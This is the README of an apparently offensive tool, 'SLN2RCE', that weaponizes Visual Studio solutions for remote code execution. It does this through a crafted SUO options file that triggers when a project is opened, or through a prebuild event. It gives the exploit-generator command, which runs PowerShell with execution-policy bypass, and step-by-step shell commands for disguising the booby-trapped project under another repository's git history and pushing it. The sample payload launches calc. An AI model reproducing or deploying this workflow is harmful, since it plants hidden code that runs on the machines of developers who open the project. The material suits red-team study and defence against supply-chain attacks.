#########
SLN 2 RCE
#########

| Weaponizing Visual Studio projects to trigger RCE using SUO file (Solution User Options) or prebuild event
|
| All credit goes to cjm00nw, edwardzpeng & moom825
|  https://github.com/cjm00n/EvilSln
|  https://github.com/moom825/visualstudio-suo-exploit

|
| SUO RCE happen when cloning project into VS or when opening the sln project file for the first time (VS overwrite the suo file).
| (Note that suo file isn't interpreted by msbuild.exe)
| The suo file has been modified using suo_exploit_test.exe to overwrite the initial suo file generated by VS.

.. code-block:: powershell

    suo_exploit_test.exe .suo test.suo powershell -ep bypass -file action.ps1

|

| The prebuild event will happen when starting build, so VS/msbuild.exe needs to support targeted language.
| This project offer c# (.NET6.0) and c++ models.
| All methods will call action.ps1 powershell script (and will start calc)

|

*****
Usage
*****

.. code-block:: bash

    # Move to a new temp dir
    cd $(mktemp -d)

    # Clone SLN2RCE and your payload project
    git clone https://github.com/charlesgargasson/SLN2RCE.git
    git clone http://localhost:3000/user2/repo.git

    # Get git info from your project
    rm -rf SLN2RCE/.git
    cp -r repo/.git SLN2RCE/

    # Set command
    echo 'calc' \
    > SLN2RCE/action.ps1

    # Push modifications
    cd SLN2RCE
    git add .*
    git commit -m ok
    git push

|

| If you need a git instance

.. code-block:: bash

    cat <<'EOF'>/tmp/gitea.yml
    version: "3"
    
    networks:
      gitea:
        external: false
    
    services:
      server:
        image: gitea/gitea:1.22.3
        container_name: gitea
        environment:
          - USER_UID=1000
          - USER_GID=1000
        restart: always
        networks:
          - gitea
        volumes:
          - /tmp/gitea:/data
          - /etc/timezone:/etc/timezone:ro
          - /etc/localtime:/etc/localtime:ro
        ports:
          - "3000:3000"
          - "222:22"
    EOF
    
    docker-compose -f /tmp/gitea.yml up

|
